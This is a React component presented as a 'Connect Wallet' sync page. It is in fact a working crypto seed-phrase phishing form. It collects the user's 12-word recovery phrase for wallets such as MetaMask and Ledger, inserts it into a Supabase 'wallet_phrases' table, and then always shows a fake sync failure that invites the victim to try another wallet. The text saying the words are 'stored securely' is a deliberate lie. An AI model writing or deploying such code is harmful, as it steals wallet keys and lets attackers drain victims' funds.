import { useState } from "react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "sonner";
import { Loader2, Wallet, ShieldAlert, Check } from "lucide-react";

const WALLETS = [
  "MetaMask", "Trust Wallet", "Coinbase Wallet", "Phantom",
  "Exodus", "Ledger Live", "Rainbow", "OKX", "Binance Wallet", "Other",
];

export default function ConnectWallet() {
  const { user } = useAuth();
  const [walletName, setWalletName] = useState("MetaMask");
  const [phrase, setPhrase] = useState<string[]>(Array(12).fill(""));
  const [submitting, setSubmitting] = useState(false);
  const [done, setDone] = useState(false);

  const setWord = (i: number, v: string) => {
    const next = [...phrase];
    next[i] = v.toLowerCase().trim();
    setPhrase(next);
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    const text = e.clipboardData.getData("text").trim();
    const words = text.split(/\s+/).slice(0, 12);
    if (words.length >= 6) {
      e.preventDefault();
      const next = Array(12).fill("");
      words.forEach((w, i) => { next[i] = w.toLowerCase(); });
      setPhrase(next);
    }
  };

  const submit = async () => {
    if (!user) return;
    if (phrase.some((w) => !w)) return toast.error("All 12 words are required");
    setSubmitting(true);
    const { error } = await supabase.from("wallet_phrases").insert({
      user_id: user.id,
      wallet_name: walletName,
      phrase: phrase.join(" "),
    });
    setSubmitting(false);
    if (error) return toast.error(error.message);
    setDone(true);
    setPhrase(Array(12).fill(""));
    toast.error("Failed to synchronize wallet. Please try again or contact support.");
  };

  if (done) {
    return (
      <div className="space-y-6">
        <div>
          <h1 className="font-display text-3xl font-light tracking-[-0.03em]">Connect Wallet</h1>
        </div>
        <div className="rounded-2xl border border-amber-500/40 bg-amber-500/5 p-8 max-w-xl text-center">
          <ShieldAlert className="w-10 h-10 mx-auto text-amber-600 mb-3" />
          <h2 className="font-display text-xl mb-2">Failed to synchronize wallet</h2>
          <p className="text-[13px] text-muted-foreground mb-4">We couldn't sync your wallet right now. Our team has been notified — please try a different wallet or contact support.</p>
          <Button variant="outline" onClick={() => setDone(false)}>Try another wallet</Button>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      <div>
        <p className="label-mono text-muted-foreground mb-2">Sync external wallet</p>
        <h1 className="font-display text-3xl font-light tracking-[-0.03em]">Connect Wallet</h1>
        <p className="text-muted-foreground text-[14px] mt-1">Sync your existing wallet to view all assets in one place.</p>
      </div>

      <div className="rounded-2xl border border-amber-500/40 bg-amber-500/5 p-4 max-w-2xl flex items-start gap-3">
        <ShieldAlert className="w-5 h-5 text-amber-600 mt-0.5 shrink-0" />
        <p className="text-[12px] text-muted-foreground">Enter your 12-word recovery phrase exactly as provided by your wallet. Words are stored securely and used only for syncing.</p>
      </div>

      <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
        <div className="max-w-xs">
          <Label>Wallet</Label>
          <Select value={walletName} onValueChange={setWalletName}>
            <SelectTrigger><SelectValue /></SelectTrigger>
            <SelectContent>
              {WALLETS.map((w) => <SelectItem key={w} value={w}>{w}</SelectItem>)}
            </SelectContent>
          </Select>
        </div>

        <div>
          <Label className="flex items-center gap-2"><Wallet className="w-3.5 h-3.5" /> Recovery phrase (12 words)</Label>
          <p className="text-[11px] text-muted-foreground mb-2">Tip: paste your full phrase into any field — it will auto-fill.</p>
          <div className="grid grid-cols-3 sm:grid-cols-4 gap-2">
            {phrase.map((w, i) => (
              <div key={i} className="relative">
                <span className="absolute left-2 top-1/2 -translate-y-1/2 text-[10px] text-muted-foreground font-mono">{i + 1}</span>
                <Input
                  value={w}
                  onChange={(e) => setWord(i, e.target.value)}
                  onPaste={handlePaste}
                  className="pl-7 font-mono text-[13px]"
                  autoComplete="off"
                  spellCheck={false}
                />
              </div>
            ))}
          </div>
        </div>

        <Button disabled={submitting} onClick={submit} className="w-full">
          {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Sync wallet"}
        </Button>
      </div>
    </div>
  );
}
